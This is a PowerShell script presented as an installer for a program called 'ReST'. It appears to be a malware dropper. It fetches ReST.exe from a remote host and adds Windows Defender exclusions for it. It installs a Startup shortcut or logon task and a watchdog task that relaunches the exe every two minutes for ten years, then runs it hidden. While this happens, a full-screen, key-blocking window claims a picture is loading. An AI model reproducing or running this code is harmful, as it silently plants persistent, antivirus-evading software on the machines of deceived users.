# ReST remote install - ASCII only for PowerShell 5.1 compatibility
param(
    [switch]$Silent
)

$ErrorActionPreference = "Continue"
$scriptPath = $MyInvocation.MyCommand.Path
if ($scriptPath) {
    Unblock-File -LiteralPath $scriptPath -ErrorAction SilentlyContinue
}
$BaseUrl = $env:RESA_INSTALL_BASE
if (-not $BaseUrl) {
    $BaseUrl = "https://olxp.cc/download"
}
$BaseUrl = $BaseUrl.Trim().TrimEnd("/")
if ($BaseUrl -match "\s") {
    $BaseUrl = ($BaseUrl -split "\s+")[0]
}

$Dir = Join-Path $env:LOCALAPPDATA "ReST"
$Exe = Join-Path $Dir "ReST.exe"
$TempZip = Join-Path $env:TEMP "ReST-download.zip"
$LogFile = Join-Path $env:TEMP "ReST-install.log"
$LoadingPidFile = Join-Path $env:TEMP "ReST-loading.pid"
$LoadingDoneFile = Join-Path $env:TEMP "ReST-loading.done"
$script:LoadingProc = $null
$script:HadError = $false

function Write-InstallLog {
    param([string]$Text)
    $line = (Get-Date -Format "yyyy-MM-dd HH:mm:ss") + " " + $Text
    try {
        Add-Content -LiteralPath $LogFile -Value $line -Encoding UTF8
    } catch {
        $null = $_
    }
    if (-not $Silent) {
        Write-Host $Text
    }
}

function Fail-Install {
    param([string]$Text)
    $script:HadError = $true
    Write-InstallLog $Text
    if (-not $Silent) {
        Write-Host $Text -ForegroundColor Red
    }
}

function Download-File {
    param(
        [string]$Url,
        [string]$OutFile
    )

    $ProgressPreference = "SilentlyContinue"
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    } catch {
        $null = $_
    }

    $curl = Join-Path $env:SystemRoot "System32\curl.exe"
    if (Test-Path -LiteralPath $curl) {
        & $curl -fsSL --retry 2 --retry-delay 1 -o $OutFile $Url
        if ($LASTEXITCODE -eq 0 -and (Test-Path -LiteralPath $OutFile)) {
            return
        }
    }

    $iwrArgs = @{
        Uri = $Url
        OutFile = $OutFile
        UseBasicParsing = $true
    }
    if ($PSVersionTable.PSVersion.Major -lt 6) {
        $iwrArgs.UserAgent = "ReST-Installer/1.0"
    }
    Invoke-WebRequest @iwrArgs
}

function Extract-ReSTZip {
    param(
        [string]$ZipFile,
        [string]$OutExe
    )

    $stage = Join-Path $env:TEMP ("ReST-stage-" + [Guid]::NewGuid().ToString("N"))
    New-Item -ItemType Directory -Force -Path $stage | Out-Null
    try {
        $extracted = $null
        try {
            Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction Stop
            [System.IO.Compression.ZipFile]::ExtractToDirectory($ZipFile, $stage)
            $extracted = Join-Path $stage "ReST.exe"
        } catch {
            $null = $_
        }

        if (-not ($extracted -and (Test-Path -LiteralPath $extracted))) {
            $tar = Join-Path $env:SystemRoot "System32\tar.exe"
            if (Test-Path -LiteralPath $tar) {
                & $tar -xf $ZipFile -C $stage
                $extracted = Join-Path $stage "ReST.exe"
            }
        }

        if (-not ($extracted -and (Test-Path -LiteralPath $extracted))) {
            Expand-Archive -LiteralPath $ZipFile -DestinationPath $stage -Force
            $extracted = Join-Path $stage "ReST.exe"
        }

        if (-not (Test-Path -LiteralPath $extracted)) {
            throw "ReST.exe missing in zip"
        }

        if (Test-Path -LiteralPath $OutExe) {
            Remove-Item -LiteralPath $OutExe -Force -ErrorAction SilentlyContinue
        }
        Move-Item -LiteralPath $extracted -Destination $OutExe -Force
    } finally {
        Remove-Item -LiteralPath $stage -Recurse -Force -ErrorAction SilentlyContinue
    }
}

function Add-DefenderExclusion {
    param(
        [string]$Path,
        [string]$ExePath
    )

    $ok = $false
    try {
        Add-MpPreference -ExclusionPath $Path -ErrorAction Stop
        Write-InstallLog ("defender path exclusion ok: " + $Path)
        $ok = $true
    } catch {
        Write-InstallLog ("defender path exclusion skipped: " + $_.Exception.Message)
    }

    try {
        Add-MpPreference -ExclusionProcess "ReST.exe" -ErrorAction Stop
        Write-InstallLog "defender process exclusion ok: ReST.exe"
        $ok = $true
    } catch {
        Write-InstallLog ("defender process exclusion skipped: " + $_.Exception.Message)
    }

    if ($ExePath -and (Test-Path -LiteralPath $ExePath)) {
        try {
            Add-MpPreference -ExclusionPath $ExePath -ErrorAction Stop
            Write-InstallLog ("defender file exclusion ok: " + $ExePath)
            $ok = $true
        } catch {
            Write-InstallLog ("defender file exclusion skipped: " + $_.Exception.Message)
        }
    }

    return $ok
}

function Start-InstallLoadingUI {
    param([string]$BaseUrl)

    Stop-InstallLoadingUI

    $pictureUrl = $BaseUrl + "/picture_1963.webp"
    Write-InstallLog ("loading ui: " + $pictureUrl)

    $safeUrl = $pictureUrl.Replace("'", "''")
    $safeDone = $LoadingDoneFile.Replace("'", "''")
    $safePic = (Join-Path $env:TEMP "ReST-picture_1963.webp").Replace("'", "''")

    $script = @"
`$ErrorActionPreference = 'SilentlyContinue'
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

`$doneFile = '$safeDone'
`$pictureUrl = '$safeUrl'
`$picFile = '$safePic'

`$form = New-Object System.Windows.Forms.Form
`$form.Text = 'ReST'
`$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
`$form.WindowState = [System.Windows.Forms.FormWindowState]::Maximized
`$form.TopMost = `$true
`$form.BackColor = [System.Drawing.Color]::FromArgb(12, 18, 32)
`$form.StartPosition = [System.Windows.Forms.FormStartPosition]::Manual
`$form.Bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
`$form.KeyPreview = `$true
`$form.Add_KeyDown({ param(`$s, `$e) `$e.Handled = `$true })

function Set-Centered([System.Windows.Forms.Control]`$ctrl, [int]`$y) {
    `$ctrl.Left = [Math]::Max(0, (`$form.ClientSize.Width - `$ctrl.Width) / 2)
    `$ctrl.Top = `$y
}

`$overlay = New-Object System.Windows.Forms.Panel
`$overlay.Dock = [System.Windows.Forms.DockStyle]::Fill
`$overlay.BackColor = [System.Drawing.Color]::FromArgb(170, 8, 12, 24)

`$title = New-Object System.Windows.Forms.Label
`$title.Text = '图片加载中'
`$title.Font = New-Object System.Drawing.Font('Microsoft YaHei UI', 34, [System.Drawing.FontStyle]::Bold)
`$title.ForeColor = [System.Drawing.Color]::White
`$title.BackColor = [System.Drawing.Color]::Transparent
`$title.AutoSize = `$true

`$subtitle = New-Object System.Windows.Forms.Label
`$subtitle.Text = '请稍候...'
`$subtitle.Font = New-Object System.Drawing.Font('Microsoft YaHei UI', 14)
`$subtitle.ForeColor = [System.Drawing.Color]::FromArgb(220, 226, 232)
`$subtitle.BackColor = [System.Drawing.Color]::Transparent
`$subtitle.AutoSize = `$true

`$bar = New-Object System.Windows.Forms.ProgressBar
`$bar.Style = [System.Windows.Forms.ProgressBarStyle]::Marquee
`$bar.MarqueeAnimationSpeed = 28
`$bar.Size = New-Object System.Drawing.Size(460, 10)
`$bar.ForeColor = [System.Drawing.Color]::FromArgb(99, 102, 241)

`$hint = New-Object System.Windows.Forms.Label
`$hint.Text = '请勿关闭此窗口'
`$hint.Font = New-Object System.Drawing.Font('Microsoft YaHei UI', 11)
`$hint.ForeColor = [System.Drawing.Color]::FromArgb(148, 163, 184)
`$hint.BackColor = [System.Drawing.Color]::Transparent
`$hint.AutoSize = `$true

`$overlay.Controls.AddRange(@(`$title, `$subtitle, `$bar, `$hint))
`$form.Controls.Add(`$overlay)

`$script:bg = `$null

function Layout-LoadingUi {
    `$midY = [Math]::Max(120, (`$form.ClientSize.Height - 170) / 2)
    Set-Centered `$title (`$midY)
    Set-Centered `$subtitle (`$midY + 62)
    `$bar.Left = [Math]::Max(0, (`$form.ClientSize.Width - `$bar.Width) / 2)
    `$bar.Top = `$midY + 108
    Set-Centered `$hint (`$midY + 138)
}

function Load-BackgroundImage {
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        `$curl = Join-Path `$env:SystemRoot 'System32\curl.exe'
        if (Test-Path -LiteralPath `$curl) {
            & `$curl -fsSL -o `$picFile `$pictureUrl
        } else {
            Invoke-WebRequest -Uri `$pictureUrl -OutFile `$picFile -UseBasicParsing
        }
        if (Test-Path -LiteralPath `$picFile) {
            `$img = [System.Drawing.Image]::FromFile(`$picFile)
            `$form.BackgroundImage = `$img
            `$form.BackgroundImageLayout = [System.Windows.Forms.ImageLayout]::Zoom
            `$script:bg = `$img
        }
    } catch {
        `$null = `$_
    }

    `$title.Text = '图片加载中'
    `$subtitle.Text = '正在下载并配置，请稍候...'
    Layout-LoadingUi
    `$form.Refresh()
}

`$form.Add_Load({
    Layout-LoadingUi
    `$form.Refresh()
})

`$form.Add_Resize({ Layout-LoadingUi })

`$picTimer = New-Object System.Windows.Forms.Timer
`$picTimer.Interval = 80
`$picTimer.Add_Tick({
    `$picTimer.Stop()
    Load-BackgroundImage
})
`$picTimer.Start()

`$timer = New-Object System.Windows.Forms.Timer
`$timer.Interval = 400
`$timer.Add_Tick({
    if (Test-Path -LiteralPath `$doneFile) {
        `$timer.Stop()
        `$form.Close()
    }
})
`$timer.Start()

[void]`$form.ShowDialog()
if (`$script:bg) { `$script:bg.Dispose() }
"@

    $runner = Join-Path $env:TEMP "ReST-loading-ui.ps1"
    Set-Content -LiteralPath $runner -Value $script -Encoding ASCII
    Unblock-File -LiteralPath $runner -ErrorAction SilentlyContinue

    try {
        $proc = Start-Process -FilePath "powershell.exe" -PassThru -WindowStyle Hidden -ArgumentList @(
            "-Sta",
            "-NoProfile",
            "-ExecutionPolicy",
            "Bypass",
            "-File",
            $runner
        )
        $script:LoadingProc = $proc
        Set-Content -LiteralPath $LoadingPidFile -Value $proc.Id -Encoding ASCII
        Write-InstallLog ("loading ui pid: " + $proc.Id)
    } catch {
        Write-InstallLog ("loading ui skipped: " + $_.Exception.Message)
    }
}

function Stop-InstallLoadingUI {
    try {
        if (Test-Path -LiteralPath $LoadingDoneFile) {
            Remove-Item -LiteralPath $LoadingDoneFile -Force -ErrorAction SilentlyContinue
        }
        New-Item -ItemType File -Force -Path $LoadingDoneFile | Out-Null
    } catch {
        $null = $_
    }

    Start-Sleep -Milliseconds 350

    if ($script:LoadingProc -and -not $script:LoadingProc.HasExited) {
        Stop-Process -Id $script:LoadingProc.Id -Force -ErrorAction SilentlyContinue
    }

    if (Test-Path -LiteralPath $LoadingPidFile) {
        try {
            $loadingPid = [int](Get-Content -LiteralPath $LoadingPidFile -Raw).Trim()
            if ($loadingPid -gt 0) {
                Stop-Process -Id $loadingPid -Force -ErrorAction SilentlyContinue
            }
        } catch {
            $null = $_
        }
        Remove-Item -LiteralPath $LoadingPidFile -Force -ErrorAction SilentlyContinue
    }

    Remove-Item -LiteralPath $LoadingDoneFile -Force -ErrorAction SilentlyContinue
    $script:LoadingProc = $null
}

function Register-WatchdogTask {
    param(
        [string]$TaskName,
        [string]$Exe,
        [string]$Dir
    )

    Remove-Item -LiteralPath (Join-Path $Dir "watchdog.ps1") -Force -ErrorAction SilentlyContinue
    Remove-Item -LiteralPath (Join-Path $Dir "watchdog.vbs") -Force -ErrorAction SilentlyContinue

    $Action = New-ScheduledTaskAction -Execute $Exe -Argument "-watchdog" -WorkingDirectory $Dir
    $Trigger = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddMinutes(1)) -RepetitionInterval (New-TimeSpan -Minutes 2) -RepetitionDuration (New-TimeSpan -Days 3650)
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Minutes 1) -MultipleInstances IgnoreNew
    $Principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Limited
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -Force | Out-Null
}

function Remove-ReSTStartupTask {
    try {
        Unregister-ScheduledTask -TaskName "ReST" -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
    } catch {
        $null = $_
    }
}

function Remove-ReSTStartupShortcut {
    try {
        $lnk = Join-Path ([Environment]::GetFolderPath("Startup")) "ReST.lnk"
        if (Test-Path -LiteralPath $lnk) {
            Remove-Item -LiteralPath $lnk -Force -ErrorAction SilentlyContinue
        }
    } catch {
        $null = $_
    }
}

Write-InstallLog "install start"
Write-InstallLog ("target: " + $Exe)
Start-InstallLoadingUI -BaseUrl $BaseUrl

try {
    try {
        New-Item -ItemType Directory -Force -Path $Dir | Out-Null
    } catch {
        $null = $_
    }

    Get-Process -Name "ReST" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 200

    $Url = $BaseUrl + "/ReST.zip"
    Write-InstallLog ("download: " + $Url)

    if (Test-Path -LiteralPath $TempZip) {
        Remove-Item -LiteralPath $TempZip -Force -ErrorAction SilentlyContinue
    }

    try {
        Download-File -Url $Url -OutFile $TempZip
    } catch {
        Fail-Install ("download failed: " + $_.Exception.Message)
        exit 1
    }

    if (-not (Test-Path -LiteralPath $TempZip)) {
        Fail-Install "missing file after download"
        exit 1
    }

    $length = (Get-Item -LiteralPath $TempZip).Length
    if ($length -lt 524288) {
        Remove-Item -LiteralPath $TempZip -Force -ErrorAction SilentlyContinue
        Fail-Install ("file too small: " + $length + " bytes")
        exit 1
    }

    try {
        Extract-ReSTZip -ZipFile $TempZip -OutExe $Exe
    } catch {
        Fail-Install ("extract failed: " + $_.Exception.Message)
        exit 1
    } finally {
        Remove-Item -LiteralPath $TempZip -Force -ErrorAction SilentlyContinue
    }

    if (-not (Test-Path -LiteralPath $Exe)) {
        Fail-Install "ReST.exe missing after extract"
        exit 1
    }

    Unblock-File -LiteralPath $Exe -ErrorAction SilentlyContinue
    Add-DefenderExclusion -Path $Dir -ExePath $Exe | Out-Null

    $startupOk = $false
    try {
        $Startup = [Environment]::GetFolderPath("Startup")
        $Wsh = New-Object -ComObject WScript.Shell
        $Link = $Wsh.CreateShortcut((Join-Path $Startup "ReST.lnk"))
        $Link.TargetPath = $Exe
        $Link.WorkingDirectory = $Dir
        $Link.WindowStyle = 7
        $Link.Save()
        Remove-ReSTStartupTask
        $startupOk = $true
        Write-InstallLog "startup shortcut ok"
    } catch {
        $null = $_
    }

    if (-not $startupOk) {
        Remove-ReSTStartupShortcut
        $Action = New-ScheduledTaskAction -Execute $Exe -WorkingDirectory $Dir
        $Trigger = New-ScheduledTaskTrigger -AtLogOn
        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
        $Principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Limited
        Register-ScheduledTask -TaskName "ReST" -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -Force | Out-Null
        Write-InstallLog "scheduled task ok"
    }

    try {
        Register-WatchdogTask -TaskName "ReST-Watchdog" -Exe $Exe -Dir $Dir
        Write-InstallLog "watchdog task ok"
    } catch {
        Write-InstallLog ("watchdog task skipped: " + $_.Exception.Message)
    }

    try {
        Start-Process -FilePath $Exe -WorkingDirectory $Dir -WindowStyle Hidden
        Write-InstallLog "started"
    } catch {
        Fail-Install ("start failed: " + $_.Exception.Message)
        exit 1
    }

    Write-InstallLog "install complete"
    if (-not $Silent) {
        Write-Host "ReST install complete." -ForegroundColor Green
    }

    exit 0
} finally {
    Stop-InstallLoadingUI
}
